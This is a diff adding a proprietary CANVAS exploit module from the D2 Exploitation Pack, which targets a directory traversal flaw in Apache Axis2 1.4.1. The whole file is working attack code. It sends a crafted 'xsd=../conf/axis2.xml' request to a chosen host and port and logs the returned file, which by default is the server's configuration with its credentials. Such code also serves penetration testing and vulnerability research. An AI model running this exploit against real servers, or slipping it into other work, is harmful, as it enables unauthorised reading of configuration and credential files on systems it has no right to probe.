@@ -1,0 +1,111 @@
+#! /usr/bin/env python
+
+#
+# Proprietary D2 Exploitation Pack source code - use only under the license
+# agreement specified in LICENSE.txt in your D2 Exploitation Pack
+#
+# Copyright DSquare Security, LLC, 2007-2014
+#
+
+###
+# STD Modules
+###
+import sys
+
+sys.path.append(".")
+
+###
+# CANVAS Modules
+###
+import canvasengine
+from exploitutils import *
+from tcpexploit import tcpexploit
+
+###
+# Description
+###
+NAME = "d2sec_axis2_dirtrav"
+VERSION = "0.1"
+DESCRIPTION = "Apache Axis2 Directory Traversal Vulnerability"
+
+GTK2_DIALOG = 'dialog.glade2'
+
+PROPERTY = {}
+PROPERTY['TYPE'] = "Web Exploits"
+PROPERTY['SITE'] = "Remote"
+PROPERTY['ARCH'] = [ ["All"] ]
+
+DOCUMENTATION = {}
+DOCUMENTATION["Vendor"] = ""
+DOCUMENTATION["Repeatability"] = "Infinite"
+DOCUMENTATION["Versions Affected"] = "version 1.4.1"
+DOCUMENTATION["Date public"] = "2009/03/21"
+DOCUMENTATION["References"] = "https://issues.apache.org/jira/browse/AXIS2-4279"
+DOCUMENTATION["CVE Name"] = ""
+DOCUMENTATION["CVE Url"] = ""
+DOCUMENTATION["Notes"] = """Usage: d2sec_axis2_dirtrav -t target [-p port:80] -O vhost:<vhost> -O service:<service> -O filename:<pathname>
+
+With by default:
+service = '/axis2/services/Version'
+filename = '../conf/axis2.xml'
+"""
+
+CHANGELOG="""
+"""
+
+
+class theexploit (tcpexploit):
+    
+  def __init__(self):
+    tcpexploit.__init__(self)
+    self.name = NAME
+    self.vhost = ''
+    self.port = 8080 
+    self.filename = '../conf/axis2.xml'
+    self.service = '/axis2/services/Version'
+	
+  def display_content_file(self):
+    request  = "GET %s?xsd=%s HTTP/1.1\r\n"%(self.service, self.filename)
+    request += "Host: %s:%d\r\n"%(self.host, self.port)
+    request += "User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 1.1.4322; .NET CLR 2.0.50727)\r\n"
+    request += "\r\n"
+    try:
+      s = self.gettcpsock()
+      s.connect((self.host, self.port))
+      self.websend(s, request)
+      data = self.webrecv(s, 8192)
+    except Exception, e:
+      self.log('[D2] %s'%e)
+      return 0
+    self.log('%s' % data)
+    return 1
+
+  def getargs(self):
+    self.host = self.target.interface
+    self.port = int(self.argsDict.get("port", self.port))
+    self.vhost = self.argsDict.get("vhost", self.vhost)
+    self.filename = self.argsDict.get("filename", self.filename)
+    self.service = self.argsDict.get("service", self.service)
+    if not self.vhost:
+      self.vhost = self.host
+    return 0
+
+  def run(self):
+    self.getargs()
+    self.setInfo("%s attacking %s:%d" % (NAME, self.host, self.port))
+    self.log("%s attacking %s:%d" % (NAME, self.host, self.port))
+    if not self.display_content_file():
+      self.setInfo("%s attacking %s:%d - failed" % (NAME, self.host, self.port))
+      return 0
+    self.setInfo("%s attacking %s:%d - done" % (NAME, self.host, self.port))
+    self.log("%s attacking %s:%d - done" % (NAME, self.host, self.port))
+    return 1
+
+  def usage(self):
+    print "Usage: %s -t target [-p port:80] -O vhost:<url> -O service:<service> -O filename:<pathname>" % sys.argv[0]
+    sys.exit(0)
+    
+if __name__ == '__main__':
+  print "Running CANVAS %s v %s" % (NAME,VERSION)
+  app = theexploit()
+  ret = standard_callback_commandline(app)
